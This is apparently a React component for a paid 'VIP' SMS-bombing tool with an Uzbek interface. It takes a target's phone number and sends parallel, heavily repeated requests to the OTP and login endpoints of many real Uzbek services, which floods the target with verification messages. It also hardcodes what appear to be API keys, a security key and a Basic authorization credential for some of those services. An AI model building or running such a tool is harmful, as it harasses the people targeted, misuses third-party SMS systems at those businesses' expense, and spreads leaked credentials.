import React, { useState, useEffect } from "react";
import { Send, AlertCircle, CheckCircle2, Timer, XCircle } from "lucide-react";
import { useNavigate } from 'react-router-dom';
import '../src/app.css';


// Helper function to handle API requests with timeout
const sendRequest = async (url, body, method = "POST", headers = {}) => {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 10000);

  try {
    const response = await fetch(url, {
      method,
      headers: {
        "Content-Type": "application/json",
        ...headers,
      },
      body: JSON.stringify(body),
      signal: controller.signal,
    });

    clearTimeout(timeoutId);

    if (!response.ok) {
      throw new Error(`Error with request to ${url}`);
    }

    return { success: true, url };
  } catch (error) {
    clearTimeout(timeoutId);
    return { success: false, url, error: error.message };
  }
};

function VipSMSSender() {
  const [phone, setPhone] = useState("");
  const [loading, setLoading] = useState(false);
  const [successCount, setSuccessCount] = useState(0);
  const [failCount, setFailCount] = useState(0);
  const [showStats, setShowStats] = useState(false);
  const [lastSentTime, setLastSentTime] = useState(null);
  const [cooldown, setCooldown] = useState(0);

  useEffect(() => {
    let interval;
    if (cooldown > 0) {
      interval = setInterval(() => {
        setCooldown((prev) => prev - 1);
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [cooldown]);

  const sendSMS = async () => {
    if (phone.length !== 12) {
      alert("Iltimos, 12 raqamli telefon raqamini kiriting");
      return;
    }

    setLoading(true);
    setShowStats(true);
    setSuccessCount(0);
    setFailCount(0);

    const apis = [
      {
        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
        body: { phone },
      },
      {
        url: "https://api.brandstore.uz/api/auth/code/create",
        body: { phone },
      },


      {
        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://market.beeline.uz/api/web/auth/login",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://market.beeline.uz/api/web/auth/login",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://market.beeline.uz/api/web/auth/login",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://market.beeline.uz/api/web/auth/login",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://market.beeline.uz/api/web/auth/login",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
        body: { phone },
      },
      {
        url: "https://api.brandstore.uz/api/auth/code/create",
        body: { phone },
      },


      {
        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://market.beeline.uz/api/web/auth/login",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
        body: { phone },
      },
      {
        url: "https://api.brandstore.uz/api/auth/code/create",
        body: { phone },
      },

      
      {
        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://market.beeline.uz/api/web/auth/login",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
        body: { phone },
      },
      {
        url: "https://api.brandstore.uz/api/auth/code/create",
        body: { phone },
      },

      {
        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://market.beeline.uz/api/web/auth/login",
        body: { phone: `+${phone}` },
      },
         

      {
        url: "https://api.brandstore.uz/api/auth/code/create",
        body: { phone },
      },

      
      {
        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
        body: { phone: `+${phone}` },
      },

      {
        url: "https://api.brandstore.uz/api/auth/code/create",
        body: { phone },
      },

      
      {
        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
        body: { phone: `+${phone}` },
      },

      {
        url: "https://api.brandstore.uz/api/auth/code/create",
        body: { phone },
      },

      
      {
        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
        body: { phone: `+${phone}` },
      },

      {
        url: "https://api.brandstore.uz/api/auth/code/create",
        body: { phone },
      },

      
      {
        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
        body: { phone: `+${phone}` },
      },
      
      

      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://api.shop.ucell.uz/api/client/v1/auth/send', body: { phone: `+${phone}` } },      { url: 'https://api.brandstore.uz/api/auth/code/create', body: { phone } },
      { url: 'https://api.100k.uz/api/auth/sms-login', body: { phone: `+${phone}`, username: "User" } },
      { url: 'https://api.idea.uz/api/v2/otp', body: { phone_number: phone, type: "register" } },
      { url: 'https://api.radius.uz/api/v2/otp', body: { phone_number: phone } },
      { url: 'https://api.uybor.uz/api/v1/auth/code', body: { phone: `+${phone}` } },
      { url: 'https://yemak.uz/api/user/auth', body: { phone_number: phone.substring(3) } },
      { url: `https://beeline.uz/api/refill/args/auth/${phone}/otp/send`, body: {}, method: 'POST', headers: { 'xAppKey': 'Gr8M2k5FQkbK' } },
      { url: 'https://auth.itv.uz/v1/auth/via-number/sign-in', body: { phone_number: phone } },
      { url: 'https://api.podium.uz/v1/verify_phone', body: { data: { phone: `+${phone}` } } },
      { url: 'https://api.express24.uz/client/v4/authentication/code', body: { phone } },
      { url: 'https://yemak.uz/api/user/auth', body: { phone_number: phone } },
      { url: `https://beeline.uz/api/refill/args/auth/${phone}/otp/send`, body: {} },
      { url: 'https://auth.itv.uz/v1/auth/via-number/sign-in', body: { phone_number: phone } },

      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },


      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
    

      {
        url: "https://api.brandstore.uz/api/auth/code/create",
        body: { phone },
      },


      {
        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://market.beeline.uz/api/web/auth/login",
        body: { phone: `+${phone}` },
      },
         
      
      

      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://api.shop.ucell.uz/api/client/v1/auth/send', body: { phone: `+${phone}` } },      { url: 'https://api.brandstore.uz/api/auth/code/create', body: { phone } },
      { url: 'https://api.100k.uz/api/auth/sms-login', body: { phone: `+${phone}`, username: "User" } },
      { url: 'https://api.idea.uz/api/v2/otp', body: { phone_number: phone, type: "register" } },
      { url: 'https://api.radius.uz/api/v2/otp', body: { phone_number: phone } },
      { url: 'https://api.uybor.uz/api/v1/auth/code', body: { phone: `+${phone}` } },
      { url: 'https://yemak.uz/api/user/auth', body: { phone_number: phone.substring(3) } },
      { url: `https://beeline.uz/api/refill/args/auth/${phone}/otp/send`, body: {}, method: 'POST', headers: { 'xAppKey': 'Gr8M2k5FQkbK' } },
      { url: 'https://auth.itv.uz/v1/auth/via-number/sign-in', body: { phone_number: phone } },
      { url: 'https://api.podium.uz/v1/verify_phone', body: { data: { phone: `+${phone}` } } },
      { url: 'https://back.asakabank.uz/core/v1/get-in-touch-create', body: { name: "Name", phone, type: 1 } },
      { url: 'https://silkroad.ox-sys.com/market-api/sent-verification', body: { phoneNumber: `+${phone}` }, headers: { 'security-key': 'NFfZU_xXfo9D4DMAOrCDLiJ-qufE2jb1aH6YRqYlQ2g=' } },
      { url: 'https://api.7saber.uz/client/sms/send', body: { phone: `+${phone}` }, headers: { 'Authorization': 'Basic Kzk5ODkwMTIzNDU2NzpkY2QwNTRjZjJlYjM5NjIyODQxNGZmMDZmZGQ0MTA4NQ==' } },
      { url: 'https://customer.api.delever.uz/v1/customers/login', body: { phone: `+${phone}` }, headers: { 'Shipper': '0d96ff6b-d880-46e9-bb75-43db31eb0d76' } },
      { url: 'https://api.allgood.uz/auth/send-otp', body: { phone: `+${phone}` }, headers: { 'deviceid': '6c10c22247c90dc53e3f62f8efe9eddb', 'devicetype': 'WEB' } },
      { url: 'https://api.100k.uz/api/auth/sms-login', body: { phone: `+${phone}`, username: "User" } },
      { url: 'https://api.idea.uz/api/v2/otp', body: { phone_number: phone, type: 'register' } },
      { url: 'https://api.shop.ucell.uz/api/client/v1/auth/send', body: { phone } },
      { url: 'https://evsapi.ectn.uz/service/client-auth', body: { phone, lang: 'en' } },
      { url: 'https://api.express24.uz/client/v4/authentication/code', body: { phone } },
      { url: 'https://yemak.uz/api/user/auth', body: { phone_number: phone } },
      { url: `https://beeline.uz/api/refill/args/auth/${phone}/otp/send`, body: {} },
      { url: 'https://auth.itv.uz/v1/auth/via-number/sign-in', body: { phone_number: phone } },

      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },


      

      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://api.shop.ucell.uz/api/client/v1/auth/send', body: { phone: `+${phone}` } },      { url: 'https://api.brandstore.uz/api/auth/code/create', body: { phone } },
      { url: 'https://api.100k.uz/api/auth/sms-login', body: { phone: `+${phone}`, username: "User" } },
      { url: 'https://api.idea.uz/api/v2/otp', body: { phone_number: phone, type: "register" } },
      { url: 'https://api.radius.uz/api/v2/otp', body: { phone_number: phone } },
      { url: 'https://api.uybor.uz/api/v1/auth/code', body: { phone: `+${phone}` } },
      { url: 'https://yemak.uz/api/user/auth', body: { phone_number: phone.substring(3) } },
      { url: `https://beeline.uz/api/refill/args/auth/${phone}/otp/send`, body: {}, method: 'POST', headers: { 'xAppKey': 'Gr8M2k5FQkbK' } },
      { url: 'https://auth.itv.uz/v1/auth/via-number/sign-in', body: { phone_number: phone } },

      {
        url: "https://api.brandstore.uz/api/auth/code/create",
        body: { phone },
      },


      {
        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://market.beeline.uz/api/web/auth/login",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
        body: { phone },
      },
      {
        url: "https://api.brandstore.uz/api/auth/code/create",
        body: { phone },
      },


      {
        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://market.beeline.uz/api/web/auth/login",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
        body: { phone },
      },
      {
        url: "https://api.brandstore.uz/api/auth/code/create",
        body: { phone },
      },


      {
        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://market.beeline.uz/api/web/auth/login",
        body: { phone: `+${phone}` },
      },
      

      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
      { url: 'https://api.shop.ucell.uz/api/client/v1/auth/send', body: { phone: `+${phone}` } },      { url: 'https://api.brandstore.uz/api/auth/code/create', body: { phone } },
      { url: 'https://api.100k.uz/api/auth/sms-login', body: { phone: `+${phone}`, username: "User" } },
      { url: 'https://api.idea.uz/api/v2/otp', body: { phone_number: phone, type: "register" } },
      { url: 'https://api.radius.uz/api/v2/otp', body: { phone_number: phone } },
      { url: 'https://api.uybor.uz/api/v1/auth/code', body: { phone: `+${phone}` } },
      { url: 'https://yemak.uz/api/user/auth', body: { phone_number: phone.substring(3) } },
      { url: `https://beeline.uz/api/refill/args/auth/${phone}/otp/send`, body: {}, method: 'POST', headers: { 'xAppKey': 'Gr8M2k5FQkbK' } },
      { url: 'https://auth.itv.uz/v1/auth/via-number/sign-in', body: { phone_number: phone } },

      
      
      {
        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
        body: { phone },
      },
      {
        url: "https://api.brandstore.uz/api/auth/code/create",
        body: { phone },
      },


      {
        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://market.beeline.uz/api/web/auth/login",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
        body: { phone },
      },
      {
        url: "https://api.brandstore.uz/api/auth/code/create",
        body: { phone },
      },


      {
        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://market.beeline.uz/api/web/auth/login",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
        body: { phone },
      },
      {
        url: "https://api.brandstore.uz/api/auth/code/create",
        body: { phone },
      },


      {
        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://market.beeline.uz/api/web/auth/login",
        body: { phone: `+${phone}` },
      },
   
    ];

    const results = await Promise.all(
      apis.map((api) => sendRequest(api.url, api.body))
    );

    const successResults = results.filter((r) => r.success);
    const failResults = results.filter((r) => !r.success);

    setSuccessCount(successResults.length);
    setFailCount(failResults.length);
    setLastSentTime(new Date());
    setCooldown(10); // 40 second cooldown
    setLoading(false);
  };

  const formatTime = (date) => {
    return new Intl.DateTimeFormat("uz", {
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    }).format(date);
  };


  return (
    <div className="container">
      <div className="card sms-card">
      <h1 className="title">💎VIP TARIF</h1>
        <h1 className="title">🚀SMS Yuborish</h1>

        <div className="input-group">
          <label className="input-label">Telefon raqami:</label>
          <input
            type="text"
            placeholder="998901234567"
            value={phone}
            onChange={(e) =>
              setPhone(e.target.value.replace(/\D/g, "").slice(0, 12))
            }
            className="input"
            disabled={loading || cooldown > 0}
          />
          {phone && phone.length !== 12 && (
            <span className="error-text">
              <AlertCircle size={16} />
              12 raqam bo'lishi kerak
            </span>
          )}
        </div>

        {showStats && (
          <div className="stats-container">
            <div className="stat-item success">
              <CheckCircle2 size={20} />
              <span>Yuborildi: {successCount}</span>
            </div>
            <div className="stat-item error">
              <XCircle size={20} />
              <span>Xatolik: {failCount}</span>
            </div>
            {lastSentTime && (
              <div className="stat-item time">
                <Timer size={20} />
                <span>Oxirgi yuborilgan vaqt: {formatTime(lastSentTime)}</span>
              </div>
            )}
          </div>
        )}

        <button
          onClick={sendSMS}
          disabled={loading || phone.length !== 12 || cooldown > 0}
          className="button send-button"
        >
          {loading ? (
            <div className="spinner" />
          ) : cooldown > 0 ? (
            <>
              <Timer size={24} />
              {cooldown} soniya kuting
            </>
          ) : (
            <>
              <Send size={24} />
              SMS Yuborish
            </>
          )}
        </button>
      </div>
    </div>
  );
}

export default VipSMSSender;